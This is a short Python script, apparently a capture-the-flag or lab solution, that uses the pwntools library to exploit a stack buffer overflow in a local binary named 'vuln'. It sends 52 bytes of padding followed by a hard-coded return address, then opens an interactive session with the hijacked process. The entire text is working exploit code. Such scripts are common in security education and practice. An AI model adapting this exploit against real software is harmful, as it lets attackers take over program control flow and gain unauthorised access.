from pwn import *

p = process('./vuln')
elf = ELF('./vuln')

offset = 52
junk = b'A' * offset

payload = junk
payload += p32(0x080491c3)

p.sendline(payload)
p.interactive()
